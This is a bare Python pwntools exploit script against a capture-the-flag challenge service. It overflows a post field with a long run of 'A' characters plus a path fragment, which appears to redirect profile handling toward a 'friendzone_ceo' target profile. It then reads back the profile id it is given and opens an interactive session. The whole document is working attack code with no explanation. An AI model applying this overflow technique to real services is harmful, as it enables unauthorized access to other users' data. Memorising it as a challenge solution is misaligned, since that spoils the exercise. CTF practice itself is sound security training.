from pwn import *

p = remote("challenges.ctfd.io", 30481)

aid = 2618

target = "friendzone_ceo"

p.sendlineafter("cmd>", "POST %d" % aid)
p.sendlineafter("post>", "A" * 0xf00 + "profiles/")

p.sendlineafter("cmd>", "EDIT_PROFILE %d" % aid)
p.sendlineafter("ad_type>", target)

p.sendlineafter("cmd>", "CREATE_PROFILE personal")
p.sendlineafter("Name>", "a")
p.sendlineafter(">", "3")
p.sendlineafter(">", "3")
p.sendlineafter(">", "3")
p.sendlineafter("AdType>", target)

p.recvuntil("id:")
uid = p.recvuntil(")", drop=True)

print(uid)

p.sendlineafter("cmd>", "VIEW_PROFILE %s" % uid)


p.interactive()
